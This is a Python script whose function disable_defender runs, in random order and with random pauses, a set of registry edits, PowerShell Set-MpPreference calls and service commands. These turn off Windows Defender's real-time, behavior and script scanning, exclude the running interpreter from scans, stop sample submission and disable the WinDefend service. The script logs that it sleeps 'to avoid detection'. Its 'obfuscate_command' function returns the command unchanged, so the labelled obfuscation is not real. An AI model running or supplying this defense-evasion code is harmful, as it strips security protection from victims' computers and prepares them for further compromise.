import os
import subprocess
import time
import random
import logging
import sys

logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")

def obfuscate_command(command):
    parts = command.split(" ")
    return " ".join(parts)

def disable_defender():
    methods = [
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f',

        'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
        'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
        'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
        'powershell -Command "Set-MpPreference -DisableScriptScanning $true"',
        'powershell -Command "Set-MpPreference -DisableArchiveScanning $true"',

        f'powershell -Command "Add-MpPreference -ExclusionPath \'{os.path.abspath(sys.executable)}\'"',
        f'powershell -Command "Add-MpPreference -ExclusionProcess \'{os.path.basename(sys.executable)}\'"',

        'powershell -Command "Set-MpPreference -MAPSReporting 0"',
        'powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"',

        'net stop WinDefend',
        'sc config WinDefend start= disabled',

        'powershell -Command "Get-Service -Name WinDefend | Stop-Service -Force"',
        'powershell -Command "Set-Service -Name WinDefend -StartupType Disabled"',
    ]

    random.shuffle(methods)

    for method in methods:
        try:
            time.sleep(random.randint(1, 5))

            obfuscated_method = obfuscate_command(method)
            subprocess.run(obfuscated_method, shell=True, check=True)
            logging.info(f"[INFO] Executed (obfuscated): {obfuscated_method}")
        except Exception as e:
            logging.error(f"[ERROR] Failed to execute {method}: {e}")

    sleep_time = random.randint(5, 15)
    logging.info(f"[INFO] Sleeping for {sleep_time} seconds to avoid detection.")
    time.sleep(sleep_time)